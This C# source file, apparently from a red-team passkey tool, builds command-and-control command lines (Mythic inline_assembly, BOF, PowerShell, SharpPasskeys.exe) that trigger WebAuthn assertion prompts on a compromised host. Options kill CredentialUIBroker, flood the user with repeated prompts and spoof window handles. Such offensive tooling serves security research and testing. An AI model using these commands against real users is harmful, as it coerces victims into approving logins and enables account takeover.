using System.Text.RegularExpressions;
using CommunityToolkit.Mvvm.ComponentModel;
using DSInternals.Win32.WebAuthn.Interop;

namespace SpecterOps.Passkeys.Injector;

/// <summary>
/// ViewModel for the C2 Commands dialog. Generates CLI commands from assertion request options.
/// </summary>
public partial class C2CommandsDialogViewModel : ObservableObject, IC2CommandsDialogViewModel
{
    public static IReadOnlyList<PublicKeyCredentialHint> AuthenticatorTypeHints { get; } =
        Enum.GetValues<PublicKeyCredentialHint>();

    /// <summary>
    /// Maps every known <see cref="PublicKeyCredentialHint"/> to its WebAuthn DOMString
    /// (e.g., <c>client-device</c>). The single source of truth for hint rendering and parsing;
    /// <see cref="PublicKeyCredentialHint.None"/> is intentionally absent so renderers can
    /// gate on membership.
    /// </summary>
    private static readonly Dictionary<PublicKeyCredentialHint, string> s_hintApiNames = new()
    {
        [PublicKeyCredentialHint.ClientDevice] = ApiConstants.CredentialHintClientDevice,
        [PublicKeyCredentialHint.SecurityKey] = ApiConstants.CredentialHintSecurityKey,
        [PublicKeyCredentialHint.Hybrid] = ApiConstants.CredentialHintHybrid
    };

    /// <summary>
    /// Reverse lookup of <see cref="s_hintApiNames"/> for parsing WebAuthn DOMString hint values
    /// (e.g., <c>client-device</c>) back to the enum.
    /// </summary>
    private static readonly Dictionary<string, PublicKeyCredentialHint> s_hintsByApiName =
        s_hintApiNames.ToDictionary(kv => kv.Value, kv => kv.Key, StringComparer.OrdinalIgnoreCase);

    private readonly string? _rpId;
    private readonly string _challenge;
    private readonly IReadOnlyList<string> _credentialIds;

    /// <summary>
    /// Gets or sets the selected authenticator type hint.
    /// </summary>
    [ObservableProperty]
    private PublicKeyCredentialHint _selectedAuthenticatorTypeHint;

    /// <summary>
    /// Gets or sets whether the kill flag is enabled.
    /// </summary>
    [ObservableProperty]
    private bool _killCredentialUIBroker;

    /// <summary>
    /// Gets or sets whether the flood flag is enabled.
    /// </summary>
    [ObservableProperty]
    private bool _promptFlood;

    /// <summary>
    /// Gets or sets whether the spoof flag is enabled.
    /// </summary>
    [ObservableProperty]
    private bool _spoofWindowHandle;

    /// <summary>
    /// Gets or sets whether the browser-in-private-mode flag is enabled.
    /// </summary>
    [ObservableProperty]
    private bool _browserInPrivateMode;

    /// <summary>
    /// Gets the list of standalone SharpPasskeys.exe CLI commands to display.
    /// </summary>
    public ObservableCollection<string> StandaloneCommands { get; } = [];

    /// <summary>
    /// Gets whether the captured assertion can be signed by the Windows Hello for Business signer.
    /// </summary>
    private bool IsWindowsHelloForBusinessApplicable =>
        string.Equals(_rpId, WindowsHelloForBusinessSigner.RelyingPartyId, StringComparison.OrdinalIgnoreCase);

    /// <summary>
    /// Gets the list of Mythic Apollo SharpPasskeys commands to display.
    /// </summary>
    public ObservableCollection<string> MythicCommands { get; } = [];

    /// <summary>
    /// Gets the list of Passkeys BOF commands to display.
    /// </summary>
    public ObservableCollection<string> BofCommands { get; } = [];

    /// <summary>
    /// Gets the list of PowerShell commands to display.
    /// </summary>
    public ObservableCollection<string> PowerShellCommands { get; } = [];

    public C2CommandsDialogViewModel(
        PublicKeyCredentialRequestOptions assertionOptions,
        string currentAddress)
    {
        _challenge = Base64Url.EncodeToString(assertionOptions.Challenge);

        List<string> credentialIds = [];
        if (assertionOptions.AllowCredentials is { Count: > 0 } allowCredentials)
        {
            foreach (var credential in allowCredentials)
            {
                credentialIds.Add(Base64Url.EncodeToString(credential.Id));
            }
        }
        _credentialIds = credentialIds;

        if (!string.IsNullOrWhiteSpace(assertionOptions.RpId))
        {
            _rpId = ValidateRelyingPartyId(assertionOptions.RpId);
        }
        else if (!string.IsNullOrWhiteSpace(currentAddress))
        {
            // If the RP ID is not set in the options, use the current address to resolve it.
            _rpId = ValidateRelyingPartyId(new UriBuilder(currentAddress).Host);
        }

        _selectedAuthenticatorTypeHint = ResolveDefaultHint(assertionOptions.Hints);

        RebuildAllCommands();
    }

    partial void OnSelectedAuthenticatorTypeHintChanged(PublicKeyCredentialHint value) => RebuildAllCommands();

    partial void OnKillCredentialUIBrokerChanged(bool value) => RebuildAllCommands();

    partial void OnPromptFloodChanged(bool value) => RebuildAllCommands();

    partial void OnSpoofWindowHandleChanged(bool value) => RebuildAllCommands();

    partial void OnBrowserInPrivateModeChanged(bool value) => RebuildAllCommands();

    private void RebuildAllCommands()
    {
        if (string.IsNullOrEmpty(_rpId) || string.IsNullOrEmpty(_challenge))
        {
            return;
        }

        SharpPasskeysRebuildCommands();
        MythicRebuildCommands();
        BofRebuildCommands();
        PowerShellRebuildCommands();
    }

    private void SharpPasskeysRebuildCommands()
    {
        StandaloneCommands.Clear();

        string optionalParameters = SharpPasskeysBuildOptionalParameters();

        if (IsWindowsHelloForBusinessApplicable)
        {
            StandaloneCommands.Add($"SharpPasskeys.exe whfb{WindowsHelloForBusinessBuildOptionalParameters()} --challenge {_challenge}");
        }

        StandaloneCommands.Add($"SharpPasskeys.exe prompt --relying-party {_rpId}{optionalParameters} --challenge {_challenge}");

        foreach (string credentialId in _credentialIds)
        {
            StandaloneCommands.Add($"SharpPasskeys.exe prompt --relying-party {_rpId} --credential-id {credentialId}{optionalParameters} --challenge {_challenge}");
        }
    }

    private void MythicRebuildCommands()
    {
        MythicCommands.Clear();
        MythicCommands.Add("register_assembly -existingFile SharpPasskeys.exe");
        MythicCommands.Add("sleep -interval 0");

        if (IsWindowsHelloForBusinessApplicable)
        {
            string whfbArgs = $"whfb{WindowsHelloForBusinessBuildOptionalParameters()} --challenge {_challenge}";
            MythicCommands.Add($"inline_assembly -Assembly SharpPasskeys.exe -Arguments \"{whfbArgs}\"");
        }

        string optionalParameters = SharpPasskeysBuildOptionalParameters();
        string baseArgs = $"prompt --relying-party {_rpId}{optionalParameters} --challenge {_challenge}";
        string baseCommand = $"inline_assembly -Assembly SharpPasskeys.exe -Arguments \"{baseArgs}\"";

        MythicCommands.Add(baseCommand);

        foreach (string credentialId in _credentialIds)
        {
            string credArgs = $"prompt --relying-party {_rpId} --credential-id {credentialId}{optionalParameters} --challenge {_challenge}";
            MythicCommands.Add($"inline_assembly -Assembly SharpPasskeys.exe -Arguments \"{credArgs}\"");
        }
    }

    private void PowerShellRebuildCommands()
    {
        PowerShellCommands.Clear();
        PowerShellCommands.Add("Import-Module -Name DSInternals.Passkeys");

        string hintParameter = s_hintApiNames.ContainsKey(SelectedAuthenticatorTypeHint)
            ? $" -Hint {SelectedAuthenticatorTypeHint}"
            : string.Empty;
        string windowHandleParameter = SpoofWindowHandle ? " -WindowHandle 0" : string.Empty;
        string privateParameter = BrowserInPrivateMode ? " -BrowserInPrivateMode" : string.Empty;

        if (IsWindowsHelloForBusinessApplicable)
        {
            PowerShellCommands.Add($"Test-PasskeyWindowsHelloForBusiness{privateParameter} -Challenge {_challenge}");
        }

        PowerShellCommands.Add(PowerShellPrependKillBroker(PowerShellWrapWithPromptFlood($"Test-Passkey -RelyingPartyId {_rpId}{hintParameter}{windowHandleParameter}{privateParameter} -Challenge {_challenge}")));

        foreach (string credentialId in _credentialIds)
        {
            PowerShellCommands.Add(PowerShellPrependKillBroker(PowerShellWrapWithPromptFlood($"Test-Passkey -RelyingPartyId {_rpId} -CredentialId {credentialId}{hintParameter}{windowHandleParameter}{privateParameter} -Challenge {_challenge}")));
        }
    }

    private string SharpPasskeysBuildOptionalParameters()
    {
        var parameters = new List<string>();

        if (KillCredentialUIBroker)
        {
            parameters.Add("--kill");
        }

        if (PromptFlood)
        {
            parameters.Add("--flood");
        }

        if (SpoofWindowHandle)
        {
            parameters.Add("--hwnd 0");
        }

        if (BrowserInPrivateMode)
        {
            parameters.Add("--private");
        }

        if (s_hintApiNames.ContainsKey(SelectedAuthenticatorTypeHint))
        {
            parameters.Add($"--authenticator {SelectedAuthenticatorTypeHint}");
        }

        return parameters.Count > 0 ? " " + string.Join(" ", parameters) : string.Empty;
    }

    private string WindowsHelloForBusinessBuildOptionalParameters()
    {
        return BrowserInPrivateMode ? " --private" : string.Empty;
    }

    private void BofRebuildCommands()
    {
        BofCommands.Clear();

        if (IsWindowsHelloForBusinessApplicable)
        {
            BofCommands.Add($"passkeys whfb{WindowsHelloForBusinessBuildBofOptionalParameters()} /challenge:{_challenge}");
        }

        string optionalParameters = BofBuildOptionalParameters();

        BofCommands.Add($"passkeys prompt /rpid:{_rpId}{optionalParameters} /challenge:{_challenge}");

        foreach (string credentialId in _credentialIds)
        {
            BofCommands.Add($"passkeys prompt /rpid:{_rpId} /credid:{credentialId}{optionalParameters} /challenge:{_challenge}");
        }
    }

    private string BofBuildOptionalParameters()
    {
        var parameters = new List<string>();

        if (s_hintApiNames.TryGetValue(SelectedAuthenticatorTypeHint, out var hintValue))
        {
            parameters.Add($"/hint:{hintValue}");
        }

        if (SpoofWindowHandle)
        {
            parameters.Add("/hwnd:0");
        }

        if (BrowserInPrivateMode)
        {
            parameters.Add("/private");
        }

        if (PromptFlood)
        {
            parameters.Add("/flood");
        }

        return parameters.Count > 0 ? " " + string.Join(" ", parameters) : string.Empty;
    }

    private string WindowsHelloForBusinessBuildBofOptionalParameters()
    {
        return BrowserInPrivateMode ? " /private" : string.Empty;
    }

    private string PowerShellWrapWithPromptFlood(string command)
    {
        return PromptFlood ? $"1..600 | % {{ {command}; sleep 1 }}" : command;
    }

    private string PowerShellPrependKillBroker(string command)
    {
        return KillCredentialUIBroker ? $"1..2 | % {{ kill -n CredentialUIBroker; sleep 1 }}; {command}" : command;
    }

    private static string ValidateRelyingPartyId(string? rpId)
    {
        string safeRpId = rpId?.Trim() ?? string.Empty;
        if (safeRpId.Length == 0 || !SafeRelyingPartyIdRegex().IsMatch(safeRpId))
        {
            throw new ArgumentException("The relying party identifier contains unexpected characters.", nameof(rpId));
        }

        return safeRpId;
    }

    /// <summary>
    /// Matches RP IDs that look like hostnames or <c>localhost</c>, which is the shape expected
    /// for relying-party identifiers and excludes arbitrary shell-relevant text.
    /// </summary>
    [GeneratedRegex("^(?=.{1,253}$)(?:localhost|(?:(?!-)[A-Za-z0-9-]{1,63}(?<!-))(?:\\.(?:(?!-)[A-Za-z0-9-]{1,63}(?<!-)))*?)$", RegexOptions.IgnoreCase | RegexOptions.CultureInvariant)]
    private static partial Regex SafeRelyingPartyIdRegex();

    private static PublicKeyCredentialHint ResolveDefaultHint(IReadOnlyList<string>? hints)
    {
        if (hints is { Count: > 0 } && s_hintsByApiName.TryGetValue(hints[0], out var mapped))
        {
            return mapped;
        }

        return PublicKeyCredentialHint.None;
    }
}
